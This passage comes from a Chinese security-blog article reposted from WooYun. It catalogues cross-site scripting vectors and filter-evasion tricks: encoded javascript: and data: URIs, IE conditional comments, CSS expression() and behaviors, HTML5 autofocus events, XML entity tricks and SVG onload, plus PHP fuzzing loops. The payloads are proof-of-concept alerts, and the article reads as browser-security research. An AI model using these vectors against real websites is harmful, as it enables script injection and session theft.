+<pre class="prettyprint">&lt;html&gt;
+&lt;body&gt;
+&lt;div id="test"&gt;&lt;/div&gt;
+&lt;script&gt;alert(test)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p style="text-indent:2em;">
+	上面代码可以看出Javascript中并没定义test变量，但是获取到了页面中id为test的对象。
+</p>
+<p style="text-indent:2em;">
+	反过来，我们可以在外部直接控制Javascript变量，并且在一些浏览器中可以重写Javascript中已有的变量。
+</p>
+<pre class="prettyprint">&lt;html&gt;
+&lt;body&gt;
+&lt;form id="location" href="bar"&gt;
+&lt;script&gt;alert(location.href)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p style="text-indent:2em;">
+	以上代码在IE中可以看到弹出的bar，而不是当前页面的url，成功覆盖了原本的变量。
+</p>
+<p style="text-indent:2em;">
+	还有一种利用meta标签来执行Javascript：
+</p>
+<pre class="prettyprint">&lt;meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)"&gt;</pre>
+<p style="text-indent:2em;">
+	上面代码可以在Chrome，Opera，IE6中可执行javascript代码，并且弹出的时meta标签所在的域。
+</p>
+<p style="text-indent:2em;">
+	如果禁止了javascript:协议，也可使用data:协议，不过能够顺利执行javascript并且继承meta标签域的测试到的只有Opera。
+</p>
+<pre class="prettyprint">&lt;meta http-equiv="refresh" content="0; url=data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;"&gt;</pre>
+<p style="text-indent:2em;">
+	IE中为了兼容各个版本，所以有一个条件注释的语法，这个语法其他浏览器并不支持，会自动当成html注释。
+</p>
+<pre class="prettyprint">&lt;!--[if IE 8]&gt;
+&lt;p&gt;Welcome to Internet Explorer 8.&lt;/p&gt;
+&lt;![endif]--&gt;</pre>
+<p style="text-indent:2em;">
+	如上文字只有在IE8中才会显示，条件注释对于开发是一件很好的事情，可以方便的判断浏览器版本获取兼容代码展现给用户。
+</p>
+<pre class="prettyprint">&lt;!--[if gte IE 7]&gt;&lt;p&gt;You are using IE 7 or greater.&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if (IE 5)]&gt;&lt;p&gt;You are using IE 5 (any version).&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if (gte IE 5.5)&amp;(lt IE 7)]&gt;&lt;p&gt;You are using IE 5.5 or IE 6.&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if lt IE 5.5]&gt;&lt;p&gt;Please upgrade your version of Internet Explorer.&lt;/p&gt;&lt;![endif]--&gt;
+&lt;!--[if lt Contoso 2]&gt;
+&lt;p&gt;Your version of the Contoso control is out of date; please update to the latest.&lt;/p&gt;
+&lt;![endif]--&gt;
+&lt;![if IE 8.0] &gt;
+&lt;script &gt; alert(1)&lt;/script &gt;  //只在IE8下执行
+&lt;![endif] &gt;
+&lt;![if IE 8.0000000000000000]]] &gt;
+&lt;script &gt; alert(2)&lt;/script &gt;  // IE8同样执行
+&lt;![endif] &gt;
+&lt;![if IE 8.0000000000000000?] &gt;
+&lt;script &gt; alert(3)&lt;/script &gt;  // 所有的IE都执行
+&lt;![endif] &gt;</pre>
+<p style="text-indent:2em;">
+	同时IE还支持另外一种方法来执行条件语句，就是通过<comment>标签，并且标签之间的代码并不会执行，但是其他浏览器却会执行。</comment>
+</p>
+<pre class="prettyprint">&lt;comment&gt;&lt;img src=x onerror=alert(3)&gt;&lt;comment&gt;
+&lt;comment onclick=alert(1)&gt;XXX--&gt; //Opera不执行</pre>
+<p style="text-indent:2em;">
+	IE的JS引擎里同样也有条件注释的语法：
+</p>
+<pre class="prettyprint">&lt;script&gt;
+//@cc_on!alert(1)
+/*@cc_on~alert(2)@*/
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	前面提到过标签属性中的URI可以做entity编码，同时，javascript:后面也可以做url编码，下面代码在所有浏览器中都可以成功执行。
+</p>
+<pre class="prettyprint">&lt;a href="j&amp;#x61vascript:%61lert(1)"&gt;click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	同时后面的url编码可以再做一次entity编码：
+</p>
+<pre class="prettyprint">&lt;a href="j&amp;#x61vascript:&amp;#x25;61lert(1)"&gt;click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	由于entity编码允许&amp;#之后插入任意多个0，再利用上javascript的注释混淆后：
+</p>
+<pre class="prettyprint">&lt;a href="j&amp;#x61vascript: //%0&amp;#x61 &amp;#x00025;61lert(1)"&gt;click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	base标签定义当前页面链接默认地址或默认目标，下面代码在opera中可执行：
+</p>
+<pre class="prettyprint">&lt;base href="javascript:alert(1)"/&gt;
+&lt;a href="#"&gt;click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	javascript也可以换行分割（在IE与chrome中可执行alert）：
+</p>
+<pre class="prettyprint">&lt;a href="j&amp;#x61v
+ascript: //%0&amp;#x61 &amp;#x00025;61lert(1)"&gt;click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	换行字符同时也可以使用entity编码：
+</p>
+<pre class="prettyprint">&lt;a href="j&amp;#x61va&amp;#x000Ascript://%0&amp;#x61&amp;#x00025;61lert(1)"&gt; click me&lt;/a&gt;
+
+&lt;?php
+for($i = 0; $i&lt;=65535; $i++) {
+    $chr = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8'0);
+    echo '&lt;iframe src="java'.$chr.'script:alert('.$i.')"&gt;&lt;/iframe&gt; &lt;br/&gt;';
+} ?&gt;</pre>
+<p style="text-indent:2em;">
+	上面代码可测出当前浏览器中，javascript字符串插入哪些字符仍然可以执行alert。
+</p>
+<pre class="prettyprint">&lt;a href="data:text/html;charset=utf-8;base64, PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+Og=="&gt; click&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	上面代码在Firefox和Opera中可以弹出当前域，Chrome与Safari可以弹，但是继承不到a标签所在的域，弹出为空，IE不能执行。
+</p>
+<p style="text-indent:2em;">
+	Firefox中data:协议默认MIME类型为text/html，即使你定义了一个他根本不知道的类型，他也会把它当作text/html类型：
+</p>
+<pre class="prettyprint">&lt;iframe src="data:μ,&lt;script&gt;alert(1)&lt;/script&gt;"&gt; &lt;/iframe&gt;
+&lt;iframe src="data:&amp;#ffff;,&lt;script&gt;alert(2)&lt;/script&gt;"&gt;&lt;/iframe&gt;</pre>
+<p style="text-indent:2em;">
+	利用之前总结的结论，最终可以写出下面可让Firefox执行的代码：
+</p>
+<pre class="prettyprint">&lt;iframe/
+\/src="data:μ,%3cscript%3ealert(document.dom&amp;#x25;61in+[])%3c/script%3e"&gt; &lt;/iframe&gt;</pre>
+<p style="text-indent:2em;">
+	并且火狐中会忽略data:协议中的所有空白字符：
+</p>
+<pre class="prettyprint">&lt;iframe src="data:.&amp;#x2c &amp;#x25;
+3
+cscri pt%
+3 e alert(1)
+%3c /s &amp;#x43 RIP t&gt;"&gt;</pre>
+<p style="text-indent:2em;">
+	最终可以混淆成这样：
+</p>
+<pre class="prettyprint">&lt;iframe src="d&amp;#097t&amp;#x0061:. &amp;#x2c &amp;#x25; 3
+c s cri &amp;#x00D; pt %
+3 e al\u0065rt(1)
+%3c /s &amp;#x43 RI &amp;#x009 P t&gt;"
+data:%,&lt;b&gt; &lt; s &amp;#10 c r i p t&gt;alert(1) &lt; /s &amp;#10 c r i p t&gt;</pre>
+<p style="text-indent:2em;">
+	之前提到的标签，在IE中data:协议都不能执行javascript，但是在style标签里，可以通过@import命令插入data:执行javascript：
+</p>
+<pre class="prettyprint">&lt;style&gt;
+@import "data:,*%7bx:expression(write(1))%7D";
+&lt;/style&gt;
+&lt;style&gt;
+@imp\ ort"data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d"; &lt;/style&gt;
+&lt;style&gt;
+&lt;link rel="Stylesheet" href="data:,*%7bx:expression(write(3))%7d"&gt;</pre>
+<p style="text-indent:2em;">
+	下面讨论一下事件即onload、onerror等事件之后的混淆方法：
+</p>
+<pre class="prettyprint">&lt;body onload="al&amp;#000101rt&amp;#8233
+/*&amp;#00*/(document. dom&amp;#x5cu0061in)//"&gt;</pre>
+<p style="text-indent:2em;">
+	采用了entity编码，最后一处是先使用javascript的unicode编码，然后再entity编码。
+</p>
+<p style="text-indent:2em;">
+	由于是直接处理DOM的方法和对象，与直接在script标签内处理字符串的环境还是不同，但是我们可以加注释或者换行符。
+</p>
+<pre class="prettyprint">&lt;body onload="al&amp;#000101rt&amp;#8233
+//&amp;#x0d/*&amp;#00*/(document. dom&amp;#x5cu0061in)//"&gt;</pre>
+<p style="text-indent:2em;">
+	当使用location重定向到javascript:伪协议url的时候，又可以多做一重编码了：
+</p>
+<pre class="prettyprint">&lt;body/:a/onload="location='j&amp;#97vAscript:'
++&amp;#x28[&amp;#x5d+
+'\141\l\u0065rt\r\(/*&amp;#x2a/docum%65nt.dom\x&amp;#x0032;561in)'
+)"&gt;</pre>
+<p style="text-indent:2em;">
+	事件同时又可以直接调用其他属性：
+</p>
+<pre class="prettyprint">&lt;img src="x" onload="alert(1)" onerror="this.onload()"&gt;
+&lt;img/src="*/(1)"title="alert/*"onerror="eval(title+src)"&gt;</pre>
+<p style="text-indent:2em;">
+	style属性的混淆，一个没有任何混淆的简单例子：
+</p>
+<pre class="prettyprint">&lt;input type="text" value="" style=display:block;position:absolute;top:0;left:0;width:999em; height:999em onmouseover=alert(1) a="" name="foo" /&gt;</pre>
+<p style="text-indent:2em;">
+	利用之前总结的在属性里的混淆方法：
+</p>
+<pre class="prettyprint">&lt;l1!/style="-:\65 \x/**/\p\r\0&amp;#x30;0065 /**/ssio\n(write /**&amp;#x2f(dom\u0061in))"&gt;</pre>
+<p style="text-indent:2em;">
+	在expression中，我们可以直接访问document中的write方法和domain属性，这表明我们当前位于document的DOM范围内。
+</p>
+<pre class="prettyprint">&lt;l1!/style="-:\65 \x/**/\p\r\0&amp;#x30;0065 /**/ssio\n(location='j&amp;#97vAscript:'+&amp;#x28[&amp;#x5d+'document.write\r\(/*&amp;#x2a/1)'))"&gt;</pre>
+<p style="text-indent:2em;">
+	转到javascript的URL时，已不在document当中，访问write方法时需要使用document.write。
+</p>
+<p style="text-indent:2em;">
+	看到有\xx和\xxxxxx的Unicode编码，这些都是CSS编码，与JavaScript编码非常相似。
+</p>
+<p style="text-indent:2em;">
+	下面两个URL中列举了一些浏览器对各种奇怪的css语法支持情况：
+</p>
+<p style="text-indent:2em;">
+	<a href="http://imfo.ru/csstest/css_hacks/import.php" target="_blank">http://imfo.ru/csstest/css_hacks/import.php</a> <a href="http://centricle.com/ref/css/filters/" target="_blank">http://centricle.com/ref/css/filters/</a> 
+</p>
+<p style="text-indent:2em;">
+	在IE中，css的解析非常的宽泛：
+</p>
+<pre class="prettyprint">&lt;style&gt;
+/*\*/*{x:expression(write(1))/*
+&lt;/style&gt;
+&lt;style&gt;
+_{content:"\"/*" x}
+*{0:expression(write(2))
+&lt;/style&gt;
+&lt;a style=&lt;!---/**/&amp;#61expression(write(3))/*-- &gt; X&lt;/a &gt;</pre>
+<p style="text-indent:2em;">
+	从IE5.5到IE8中，除了expression可以用来执行JavaScript之外，也可以通过HTML+TIME的形式。
+</p>
+<p style="text-indent:2em;">
+	这种方式唯一的缺点就是也需要一个事件来执行JavaScript，即onbegin或者onend：
+</p>
+<pre class="prettyprint">1&lt;l style="behavior:url(#default#time2)"onbegin="alert(1)"&gt;</pre>
+<p style="text-indent:2em;">
+	还有一种方式利用set标签：
+</p>
+<pre class="prettyprint">1&lt;set/xmlns="urn:schemas-microsoft-com:time" style="beh&amp;#x41vior:url(#default#time2)" attributename="innerhtml" to="&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=alert(1)&amp;gt;"&gt;</pre>
+<p style="text-indent:2em;">
+	测试一下style属性中在哪些浏览器中，可以插入哪些字符：
+</p>
+<pre class="prettyprint">&lt;?php
+for($i = 0; $i&lt;=65535; $i++) {
+    $chr = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8');
+    echo '&lt;a style="color='.$chr.'red"&gt;'.dechex($i).'['.$chr.']&lt;/a&gt;';
+} ?&gt;</pre>
+<p style="text-indent:2em;">
+	从测试结果可以得出，下面的代码可以在IE中执行：
+</p>
+<pre class="prettyprint">&lt;div style=xss&amp;#x2000;:&amp;#x3000;expression(write(1))&gt;</pre>
+<p style="text-indent:2em;">
+	在一些老版本的IE中，如IE6和IE7，还可以通过背景相关属性调用javascript的URL来执行javascript代码：
+</p>
+<pre class="prettyprint">&lt;b style="background:url(javascript:alert('background'))"&gt;xxx&lt;/b&gt;
+&lt;b style="background-image:url(javascript:alert('background'))"&gt; xxx&lt;/b&gt;
+&lt;b style="list-style:url(javascript:alert('background'))"&gt;xxx&lt;/b&gt;
+&lt;b style="list-style-image:url(javascript:alert('background'))"&gt; xxx&lt;/b&gt;</pre>
+<p style="text-indent:2em;">
+	通过link标签（在IE6下适用，同时javascript可以换成vbscript）：
+</p>
+<pre class="prettyprint">&lt;link rel="stylesheet" href="javascript:alert(1)"&gt;
+&lt;link rel="stylesheet" href="vb&amp;#x09script:%61lert(document.domain)"&gt;</pre>
+<p style="text-indent:2em;">
+	style标签中可以通过导入url的方式执行javascript：
+</p>
+<pre class="prettyprint">&lt;style&gt;
+@imp\o\ rt url('javascript:%61lert(2)');
+&lt;/style&gt;</pre>
+<p style="text-indent:2em;">
+	HTML5中增加了很多标签跟属性，列举一些可执行JavaScript的方法：
+</p>
+<pre class="prettyprint">&lt;form&gt;&lt;input&gt;&lt;output onforminput="alert(1)"&gt; //Opera支持</pre>
+<p style="text-indent:2em;">
+	onfocus与autofocus的配合：
+</p>
+<pre class="prettyprint">&lt;input onfocus=write(domain) autofocus&gt;
+&lt;keygen onfocus=write(domain) autofocus&gt;
+&lt;textarea onfocus=write(domain) autofocus&gt;
+&lt;body onfocus=write(domain) autofocus&gt;
+&lt;frameset onfocus=write(domain) autofocus&gt;
+&lt;button onfocus=write(domain) autofocus&gt;
+&lt;input autofocus onblur=write(domain)&gt;&lt;input autofocus&gt; //Chrome中无交互执行
+&lt;iframe/src=javascript:alert(1)&gt;
+&lt;video/poster=javascript:alert(2)&gt;
+&lt;button form="test" formaction="javascript:alert(3)"&gt;</pre>
+<p style="text-indent:2em;">
+	更多的html5攻击方式请见：<a href="http://html5sec.org/" target="_blank">http://html5sec.org/</a> 
+</p>
+<p style="text-indent:2em;">
+	XML内容比较少，就一起写到HTML里了，XML支持Unicode，所以Unicode里的所有字符都可以用来做标签或者属性，同时有可能绕过&lt;\w+匹配：
+</p>
+<pre class="prettyprint">&lt;啊 onclick="alert(1)" xmlns="http://www.w3.org/1999/xhtml"&gt;XXX&lt;/啊&gt;</pre>
+<p style="text-indent:2em;">
+	XML相比HTML最严格的就是有了开始的标签，必须要有结束标签匹配，否则会报错。
+</p>
+<p style="text-indent:2em;">
+	但是在大多数浏览器中似乎并不会影响页面中javascript的解析（IE中不执行）：
+</p>
+<pre class="prettyprint">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;script&gt;
+alert(1); // works
+&lt;/script&gt;
+&lt;p&gt;
+&lt;script&gt;
+alert(2); // works too
+&lt;/script&gt;
+&lt;/html&gt;</pre>
+<p style="text-indent:2em;">
+	甚至可以通过JavaScript修改错误页面的内容（在Firefox中可执行）：
+</p>
+<pre class="prettyprint">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;p&gt;
+&lt;script&gt;
+setTimeout(function(){ document.activeElement.textContent='hello world' },1);
+&lt;/script&gt;
+&lt;/html&gt;</pre>
+<p style="text-indent:2em;">
+	XML的编码规范与HTML非常相似，可以用entity编码属性值。 在XML中，我们可以在DOCTYPE中自定义entity，甚至通过URL引入外部文件：
+</p>
+<pre class="prettyprint">&lt;!DOCTYPE xss [&lt;!ENTITY x "&amp;#x61;l&amp;#x26;y;"&gt;&lt;!ENTITY y "ert"&gt;]&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;script&gt;&amp;x;(document.domain);&lt;/script&gt;
+&lt;/html&gt;</pre>
+<p style="text-indent:2em;">
+	上面代码定义了一个&amp;y变量为"ert"，&amp;x为"al&amp;y"（a与&amp;符号编码了一下），即alert，
+</p>
+<pre class="prettyprint">&lt;!DOCTYPE xss [&lt;!ENTITY _k "&amp;#x61;l&amp;#x26;__;"&gt;&lt;!ENTITY __ "ert" &gt; ]&gt;
+&lt;script xmlns="http://www.w3.org/1999/xhtml"&gt;
+&amp;lt;!--&amp;#10;&amp;_k;(1&amp;#x000029;
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	在xml中，包括script标签内的代码浏览器都会entity解码后执行，这点很有用：
+</p>
+<pre class="prettyprint">&lt;script xmlns="http://www.w3.org/1999/xhtml"&gt;
+a='&amp;#x27;,alert(1)//';
+b='&amp;#39;,alert(2)//';
+c='&amp;apos;,alert(3)//';
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	从5.5版本开始，Internet Explorer（IE）开始支持Web 行为的概念。
+</p>
+<p style="text-indent:2em;">
+	这些行为是由后缀名为.htc的脚本文件描述的，它们定义了一套方法和属性，几乎可以把这些方法和属性应用到HTML页面上的任何元素上去。
+</p>
+<p style="text-indent:2em;">
+	HTML中可以通过加载CSS的behavior的方式调用htc文件，仅支持同域调用：
+</p>
+<pre class="prettyprint">//HTML文件代码：
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;body { behavior: url(test.htc);}&lt;/style&gt; &lt;/head&gt;
+&lt;body&gt;Hello&lt;/body&gt;
+&lt;/html&gt;
+//htc文件代码：
+&lt;PUBLIC:COMPONENT&gt;
+&lt;PUBLIC:ATTACH EVENT="onclick" ONEVENT="alert(1)" /&gt;
+&lt;/PUBLIC:COMPONENT&gt;</pre>
+<p style="text-indent:2em;">
+	同样HTML调用XML文件执行javascript：
+</p>
+<pre class="prettyprint">&lt;html&gt;
+&lt;body&gt;
+&lt;xml id="xss" src="test.xml"&gt;&lt;/xml&gt;
+&lt;label dataformatas=html datasrc=#xss datafld=payload&gt;&lt;/label&gt; &lt;/body&gt;
+&lt;/html&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;x&gt;
+&lt;payload&gt;
+&lt;![CDATA[&lt;img src=x onerror=alert(domain)&gt;]]&gt; &lt;/payload&gt;
+&lt;/x&gt;</pre>
+<p style="text-indent:2em;">
+	dataformatas定义了获取到的数据以什么格式解析（HTML或text），datasrc指绑定的id，datafld指使用哪一段数据。
+</p>
+<p style="text-indent:2em;">
+	svg调用javascript（新版本的几个浏览器支持）：
+</p>
+<pre class="prettyprint">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;g onload="alert(1)"&gt;&lt;/g&gt;
+&lt;/svg&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(2)"&gt;&lt;/svg&gt;</pre>
+<p style="text-indent:2em;">
+	<a href="http://drops.wooyun.org/papers/147" target="_blank">[原文地址]</a> 
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">瞌睡龙</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2013-07-02
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/css/">CSS</a>
+          <a href="https://lcx.cc/tags/exp/">EXP</a>
+          <a href="https://lcx.cc/tags/google/">Google</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/java/">Java</a>
+          <a href="https://lcx.cc/tags/js/">js</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/vb/">VB</a>
+          <a href="https://lcx.cc/tags/vbs/">VBS</a>
+          <a href="https://lcx.cc/tags/xss/">XSS</a>
+          <a href="https://lcx.cc/tags/%E7%BC%96%E7%A0%81/">编码</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E8%A7%A3%E7%A0%81/">解码</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+          <a href="https://lcx.cc/tags/%E7%BB%95%E8%BF%87/">绕过</a>
+          <a href="https://lcx.cc/tags/%E4%BA%8B%E4%BB%B6/">事件</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E8%AE%A8%E8%AE%BA/">讨论</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          <a href="https://lcx.cc/tags/%E5%8D%8F%E8%AE%AE/">协议</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3645/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">乱刀砍狗，让小狗跪舔菜刀 - 菜刀过安全狗方法</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3643/">
+            <span class="next-text nav-default">Browser Security-css、javascript</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
